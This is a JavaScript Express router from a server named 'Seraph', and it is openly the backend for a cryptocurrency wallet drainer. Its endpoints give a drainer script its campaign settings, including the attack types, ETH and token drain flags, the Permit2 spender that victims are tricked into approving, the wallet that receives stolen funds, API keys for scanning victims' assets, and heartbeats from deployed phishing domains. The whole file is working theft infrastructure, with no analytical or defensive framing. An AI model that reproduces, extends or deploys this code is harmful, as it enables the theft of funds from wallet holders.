/**
 * ============================================================================
 * SERAPH SERVER - Config Routes (For Drainer Script)
 * ============================================================================
 * 
 * Public endpoints that the drainer script calls to get campaign configuration.
 * 
 * Endpoints:
 *   GET  /config/:campaignKey           - Full campaign config
 *   GET  /config/:campaignKey/spender   - Just spender address
 *   GET  /config/:campaignKey/discovery - API keys for token discovery
 *   POST /config/:campaignKey/heartbeat - Keep-alive from drainer script
 * 
 * ============================================================================
 */

import { Router } from 'express'
import { ethers } from 'ethers'
import campaignService from '../services/campaign.service.js'
import contractService from '../services/contract.service.js'
import { config } from '../config/index.js'
import { success, badRequest, notFound } from '../utils/response.js'

const router = Router()

// ============================================================================
// Helper: Get spender info from contract or legacy config
// ============================================================================

async function getSpenderInfo(campaignKey) {
  // Try contract-based spender first
  try {
    const spenderInfo = await contractService.getSpenderForCampaign(campaignKey)
    if (spenderInfo) return spenderInfo
  } catch (err) {
    // Contract service might fail, continue to legacy
  }
  
  // Legacy fallback: derive from .env private key
  if (config.drainer.permit2PrivateKey) {
    try {
      const wallet = new ethers.Wallet(config.drainer.permit2PrivateKey)
      return {
        spender: wallet.address,
        spenderType: 'legacy',
        contractAddress: null,
        chainId: config.blockchain.chainId,
        destination: null,
        onChainRegistered: false
      }
    } catch (err) {
      // Invalid private key
    }
  }
  
  return null
}

// ============================================================================
// Routes
// ============================================================================

/**
 * GET /config/:campaignKey
 * Get full campaign configuration (for drainer script initialization)
 * 
 * Returns:
 * - Campaign settings (attack types, min value, etc.)
 * - Spender from assigned contract
 * - Destination wallet
 * - API keys for token discovery
 * - Chain configuration
 */
router.get('/:campaignKey', async (req, res) => {
  try {
    const { campaignKey } = req.params
    
    // Get campaign config (validates campaign exists and is active)
    const campaignConfig = await campaignService.getCampaignByKey(campaignKey)
    
    // Get spender info
    const spenderInfo = await getSpenderInfo(campaignKey)
    
    // Build response
    const response = {
      // Campaign info
      campaignId: campaignConfig.campaignId,
      name: campaignConfig.name,
      
      // Attack configuration
      attackTypes: campaignConfig.attackTypes,
      drainEth: campaignConfig.drainEth,
      drainTokens: campaignConfig.drainTokens,
      minValueUsd: campaignConfig.minValueUsd,
      
      // Blockchain
      chainId: campaignConfig.chainId || config.blockchain.chainId,
      permit2Address: config.blockchain.permit2Address,
      
      // API keys for token discovery
      etherscanApiKey: campaignConfig.etherscanApiKey || null,
      alchemyApiKey: campaignConfig.alchemyApiKey || null,
      
      // Spender info
      spender: spenderInfo?.spender || null,
      spenderType: spenderInfo?.spenderType || null,
      contractAddress: spenderInfo?.contractAddress || null,
      destination: spenderInfo?.destination || campaignConfig.destination,
      onChainRegistered: spenderInfo?.onChainRegistered || false
    }
    
    return success(res, response)
  } catch (err) {
    return notFound(res, 'Campaign not found or inactive')
  }
}) 

/**
 * GET /config/:campaignKey/spender
 * Get spender address for signatures
 * 
 * This is what the drainer script uses to know which address
 * should be the "spender" in Permit2 signatures.
 */
router.get('/:campaignKey/spender', async (req, res) => {
  try {
    const { campaignKey } = req.params
    
    // Verify campaign exists and is active
    await campaignService.getCampaignByKey(campaignKey)
    
    // Get spender info
    const spenderInfo = await getSpenderInfo(campaignKey)
    
    if (!spenderInfo) {
      return badRequest(res, 'Spender not configured for this campaign')
    }
    
    return success(res, {
      spender: spenderInfo.spender,
      spenderType: spenderInfo.spenderType,
      contractAddress: spenderInfo.contractAddress,
      permit2: config.blockchain.permit2Address,
      chainId: spenderInfo.chainId || config.blockchain.chainId,
      destination: spenderInfo.destination,
      onChainRegistered: spenderInfo.onChainRegistered
    })
  } catch (err) {
    return notFound(res, err.message)
  }
})

/**
 * GET /config/:campaignKey/discovery
 * Get API keys for token discovery
 * 
 * Returns only the discovery-related config (for asset scanning)
 */
router.get('/:campaignKey/discovery', async (req, res) => {
  try {
    const { campaignKey } = req.params
    
    const campaignConfig = await campaignService.getCampaignByKey(campaignKey)
    
    return success(res, {
      chainId: campaignConfig.chainId || config.blockchain.chainId,
      etherscanApiKey: campaignConfig.etherscanApiKey || null,
      alchemyApiKey: campaignConfig.alchemyApiKey || null,
      ankrApiKey: campaignConfig.ankrApiKey || null,
      hasEtherscan: !!campaignConfig.etherscanApiKey,
      hasAlchemy: !!campaignConfig.alchemyApiKey,
      hasAnkr: !!campaignConfig.ankrApiKey
    })
  } catch (err) {
    return notFound(res, err.message)
  }
})

/**
 * POST /config/:campaignKey/heartbeat
 * Heartbeat from drainer script (optional, for monitoring)
 * 
 * Body: { 
 *   domain?: string,
 *   activeConnections?: number,
 *   lastActivity?: string
 * }
 */
router.post('/:campaignKey/heartbeat', async (req, res) => {
  try {
    const { campaignKey } = req.params
    
    // Verify campaign exists
    await campaignService.getCampaignByKey(campaignKey)
    
    // Could log heartbeat for monitoring, but for now just acknowledge
    // Future: track active drainer instances, last seen, etc.
    
    return success(res, { 
      acknowledged: true,
      serverTime: new Date().toISOString()
    })
  } catch (err) {
    return notFound(res, 'Campaign not found')
  }
})

export default router